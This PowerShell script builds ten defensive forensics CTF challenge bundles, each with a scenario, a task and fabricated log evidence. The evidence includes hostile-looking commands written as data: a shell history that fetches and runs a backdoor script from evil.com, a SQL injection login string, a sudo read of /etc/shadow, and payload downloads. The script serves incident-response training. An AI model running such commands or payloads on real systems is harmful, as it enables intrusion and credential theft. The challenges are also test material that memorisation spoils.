param(
    [string[]]$BundleName = @()
)

$ErrorActionPreference = "Stop"

$artifactRoot = Join-Path $PSScriptRoot "..\\artifacts\\m2"
$artifactRoot = [System.IO.Path]::GetFullPath($artifactRoot)
$buildRoot = Join-Path $env:TEMP "m2_artifacts_build"

function Write-TextFile {
    param(
        [string]$Path,
        [string]$Content
    )

    $parent = Split-Path -Parent $Path
    if ($parent) {
        New-Item -ItemType Directory -Force -Path $parent | Out-Null
    }

    [System.IO.File]::WriteAllText(
        $Path,
        $Content.Replace("`n", [Environment]::NewLine),
        [System.Text.Encoding]::UTF8
    )
}

function New-BundleDirectory {
    param([string]$Name)

    $bundlePath = Join-Path $buildRoot $Name
    New-Item -ItemType Directory -Force -Path $bundlePath | Out-Null
    New-Item -ItemType Directory -Force -Path (Join-Path $bundlePath "evidence") | Out-Null
    return $bundlePath
}

function Publish-Bundle {
    param([string]$Bundle)

    $source = Join-Path $buildRoot $Bundle
    $zipPath = Join-Path $artifactRoot ($Bundle + ".zip")
    if (Test-Path $zipPath) {
        Remove-Item -Force $zipPath
    }
    Compress-Archive -Path (Join-Path $source "*") -DestinationPath $zipPath -Force
}

function Build-CaseBundle {
    param([hashtable]$Case)

    $bundle = $Case["bundle"]
    if ($BundleName.Count -gt 0 -and -not ($BundleName -contains $bundle)) {
        return
    }

    $bundlePath = New-BundleDirectory -Name $bundle

    $description = @"
$($Case["title"])
Difficulty: $($Case["difficulty"])

Scenario:
$($Case["scenario"])

Task:
$($Case["task"])

Flag format:
CTF{answer}
"@

    Write-TextFile -Path (Join-Path $bundlePath "description.txt") -Content $description
    Write-TextFile -Path (Join-Path $bundlePath "evidence\\$($Case["evidence_name"])") -Content $Case["evidence_content"]
    Publish-Bundle -Bundle $bundle
}

$cases = @(
    @{
        bundle = "m2-01-after-hours-access"
        title = "M2-01 - After-Hours Access"
        difficulty = "Easy"
        scenario = "A SOC analyst observed successful SSH logins to a production host outside approved maintenance windows."
        task = "Identify the suspicious external IP address."
        evidence_name = "auth.log"
        evidence_content = @"
Jun 14 00:08:11 sshd[1021]: Accepted publickey for deploy from 10.0.0.15 port 42112 ssh2
Jun 14 02:12:01 sshd[3144]: Accepted password for admin from 45.83.22.91 port 51822 ssh2
Jun 14 02:13:10 sshd[3167]: Accepted password for admin from 45.83.22.91 port 51840 ssh2
Jun 14 02:14:06 sudo: admin : TTY=pts/1 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow
Jun 14 09:01:22 sshd[8702]: Accepted publickey for admin from 10.0.0.12 port 53777 ssh2
"@
    },
    @{
        bundle = "m2-02-login-storm"
        title = "M2-02 - Login Storm"
        difficulty = "Easy"
        scenario = "Authentication telemetry triggered a high-volume alert for repeated admin credential guesses."
        task = "Identify the attack type."
        evidence_name = "login_attempts.log"
        evidence_content = @"
2026-06-14T10:12:11Z user=admin password=123456 result=fail src=198.51.100.44
2026-06-14T10:12:13Z user=admin password=password result=fail src=198.51.100.44
2026-06-14T10:12:15Z user=admin password=qwerty result=fail src=198.51.100.44
2026-06-14T10:12:16Z user=admin password=letmein result=fail src=198.51.100.44
2026-06-14T10:12:18Z user=admin password=admin123 result=fail src=198.51.100.44
2026-06-14T10:12:20Z user=admin password=welcome1 result=fail src=198.51.100.44
"@
    },
    @{
        bundle = "m2-03-unknown-process"
        title = "M2-03 - Unknown Process"
        difficulty = "Easy"
        scenario = "Host monitoring captured process inventory from an app server after CPU utilization spiked."
        task = "Identify the suspicious process."
        evidence_name = "process_list.txt"
        evidence_content = @"
PID   USER      CPU  MEM  COMMAND
1004  root      0.2  1.1  systemd
1288  www-data  1.7  4.3  nginx
1430  app       2.4  5.9  python app.py
2011  user1     0.3  2.8  chrome.exe
4550  root     89.7 14.2  cryptominer
"@
    },
    @{
        bundle = "m2-04-unexpected-sudo-activity"
        title = "M2-04 - Unexpected Sudo Activity"
        difficulty = "Easy"
        scenario = "A developer account executed root-level commands during a non-release period."
        task = "Identify the account that escalated privileges."
        evidence_name = "sudo.log"
        evidence_content = @"
Jun 14 11:02:07 sudo: user=buildbot command=/usr/bin/systemctl restart app.service
Jun 14 11:04:10 sudo: user=john command=/bin/su -
Jun 14 11:04:48 sudo: user=john command=/usr/bin/apt install tcpdump
Jun 14 11:31:21 sudo: user=ops command=/usr/bin/journalctl -xe
"@
    },
    @{
        bundle = "m2-05-midnight-upload"
        title = "M2-05 - Midnight Upload"
        difficulty = "Medium"
        scenario = "DLP raised an alert for high-volume outbound transfer from a finance workstation after midnight."
        task = "Identify the file that was exfiltrated."
        evidence_name = "network_transfer.log"
        evidence_content = @"
23:49:17 user=finance.analyst action=open file=quarterly_notes.docx host=FIN-LT-22
23:50:08 user=finance.analyst action=open file=payroll.xlsx host=FIN-LT-22
23:51:02 user=finance.analyst action=upload file=payroll.xlsx destination=198.51.100.7 protocol=https
23:51:09 transfer_status=complete bytes=948736 hash=0f91aef9
"@
    },
    @{
        bundle = "m2-06-new-admin-session"
        title = "M2-06 - New Admin Session"
        difficulty = "Medium"
        scenario = "IAM audit data shows unplanned administrative account lifecycle activity."
        task = "Identify the suspicious admin account."
        evidence_name = "admin_activity.log"
        evidence_content = @"
2026-06-14T13:12:51Z actor=admin action=create_user target=backup_admin result=success
2026-06-14T13:12:57Z actor=admin action=grant_role target=backup_admin role=domain_admin
2026-06-14T13:13:11Z actor=backup_admin action=login result=success src=203.0.113.18
2026-06-14T13:16:45Z actor=backup_admin action=disable_auditd result=success
"@
    },
    @{
        bundle = "m2-07-unusual-web-request"
        title = "M2-07 - Unusual Web Request"
        difficulty = "Medium"
        scenario = "Secure web gateway logs show a user downloading an executable from a suspicious host."
        task = "Identify the malicious domain."
        evidence_name = "proxy.log"
        evidence_content = @"
2026-06-14T14:06:05Z user=analyst.pc method=GET url=http://updates.vendor.com/agent.msi status=200
2026-06-14T14:07:11Z user=analyst.pc method=GET url=http://malicious-site.ru/payload.exe status=200
2026-06-14T14:07:13Z user=analyst.pc method=GET url=http://malicious-site.ru/stage2.bin status=200
"@
    },
    @{
        bundle = "m2-08-internal-audit-trail"
        title = "M2-08 - Internal Audit Trail"
        difficulty = "Medium"
        scenario = "Audit records indicate payroll data access by a user in a non-finance department."
        task = "Identify the insider account."
        evidence_name = "audit.log"
        evidence_content = @"
2026-06-14T15:02:10Z user=alice department=marketing file=salary_records.xlsx action=read result=success
2026-06-14T15:02:19Z user=alice department=marketing file=salary_records.xlsx action=download result=success
2026-06-14T15:05:41Z user=hr.manager department=human_resources file=salary_records.xlsx action=read result=success
"@
    },
    @{
        bundle = "m2-09-strange-request-pattern"
        title = "M2-09 - Strange Request Pattern"
        difficulty = "Medium"
        scenario = "Web access telemetry shows crafted login parameters that alter SQL query logic."
        task = "Identify the vulnerability being exploited."
        evidence_name = "web_access.log"
        evidence_content = @"
10.8.1.24 - - [14/Jun/2026:16:22:40 +0530] \"GET /login?user=admin&pass=Welcome!23 HTTP/1.1\" 401 512
10.8.1.24 - - [14/Jun/2026:16:22:48 +0530] \"GET /login?user=admin' OR '1'='1&pass=x HTTP/1.1\" 200 921
10.8.1.24 - - [14/Jun/2026:16:22:53 +0530] \"GET /admin HTTP/1.1\" 200 1928
"@
    },
    @{
        bundle = "m2-10-shell-history-review"
        title = "M2-10 - Shell History Review"
        difficulty = "Medium"
        scenario = "Responders collected shell command history from a compromised Linux account."
        task = "Identify the command used to download the malicious script."
        evidence_name = "bash_history"
        evidence_content = @"
pwd
ls -la
wget http://evil.com/backdoor.sh
chmod +x backdoor.sh
./backdoor.sh
history | tail -n 20
"@
    }
)

if (Test-Path $buildRoot) {
    Remove-Item -Recurse -Force $buildRoot
}
New-Item -ItemType Directory -Force -Path $buildRoot | Out-Null
New-Item -ItemType Directory -Force -Path $artifactRoot | Out-Null

foreach ($case in $cases) {
    Build-CaseBundle -Case $case
}

Write-Host "M2 artifact bundles generated in $artifactRoot"
